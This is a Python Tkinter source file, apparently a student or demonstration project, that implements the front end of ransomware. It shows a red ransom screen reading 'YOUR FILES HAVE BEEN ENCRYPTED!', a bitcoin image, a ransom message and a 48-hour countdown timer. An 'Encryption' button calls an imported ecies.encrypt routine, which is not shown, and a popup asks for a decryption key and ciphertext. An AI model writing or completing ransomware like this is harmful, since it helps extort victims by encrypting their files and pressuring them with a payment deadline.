from tkinter import *
from tkinter import messagebox
from PIL import ImageTk, Image
import datetime
import tkinter as tk

import binascii, ecies, message, datetime

"""
 Author @Meiling Liu

 Reference:
 		counting down timer:
        -https://codereview.stackexchange.com/questions/184326/basic-countdown-timer

"""

class Countdown(tk.Frame):
    '''A Frame with label to show the time left, an entry to input the seconds to count
    down from, and a start button to start counting down.'''
    def __init__(self, master):
        super().__init__(master)
        self.create_widgets()
        self.show_widgets()
        self.seconds_left = 172800
        self._timer_on = False

    def show_widgets(self):
        self.label.pack()

    def create_widgets(self):

        self.label = tk.Label(self, text="00:00:00")
        self.start_button()

    def countdown(self):
        '''Update label based on the time left.'''
        self.label['text'] = self.convert_seconds_left_to_time()

        if self.seconds_left:
            self.seconds_left -= 1
            self._timer_on = self.after(1000, self.countdown)
        else:
            self._timer_on = False

    def start_button(self):
        '''Start counting down.'''
        self.seconds_left = 172800
        self.countdown()

    def convert_seconds_left_to_time(self):

        return datetime.timedelta(seconds=self.seconds_left)


class decrypt(object):
    def __init__(self,master):
        top=self.top=Toplevel(master)
        self.l=Label(top,text="Enter key:")
        self.l.pack()
        self.e=Entry(top)
        self.e.pack()
        self.k=Label(top,text="Enter cipher(copy everything from 'XXX'):")
        self.k.pack()
        self.f=Entry(top)
        self.f.pack()
        self.b=Button(top,text='Ok',command=self.cleanup)
        self.b.pack()
    def cleanup(self):
        self.value=self.e.get()
        ecies.decrypt(int(self.value), binascii.unhexlify(self.f.get()))	# decryption
        self.top.destroy()

class enterKey(object):
    def __init__(self,master):
        self.master=master
        self.b=Button(master,text="Decryption",command=self.popup)
        self.b.pack(anchor=E)

    def popup(self):
        self.w=decrypt(self.master)
        self.b["state"] = "disabled" 
        self.master.wait_window(self.w.top)
        self.b["state"] = "normal"

    def entryValue(self):
        return self.w.value

if __name__ == '__main__':
	root = Tk()

	root.title("Ransomware")
	root.configure(background='red3', height=0, width=0)

	countdown = Countdown(root)

	titleName = Label(root, bg="red3", text = "Ransomware", font="Helvetica 24 bold")
	warning = Label(root, bg="red3", text = "YOUR FILES HAVE BEEN ENCRYPTED!", fg="yellow", font="Helvetica 18 bold")
	titleName.pack(side="top")
	warning.pack()


	img1 = ImageTk.PhotoImage(Image.open("bitcoin.gif"))  
	#The Label widget is a standard Tkinter widget used to display a text or image on the screen.
	panel1 = Label(root, bg="red3", image = img1)
	#The Pack geometry manager packs widgets in rows or columns.
	panel1.pack(anchor= W)

	text = Label(root, justify=LEFT, text=message.notify(), height=10, width=0, font="Helvetica")
	text.pack()


	# encrypt files
	def encrypt():
		ecies.encrypt()


	B1 = Button(root, bg="red3", text = "Encryption", command = encrypt)
	B1.pack(anchor= E)

	m=enterKey(root)

	B2 = Button(root, bg="red3", text = "Exit", command = exit)
	B2.pack(anchor= E)


	countdown.pack(anchor= S)

	root.mainloop()




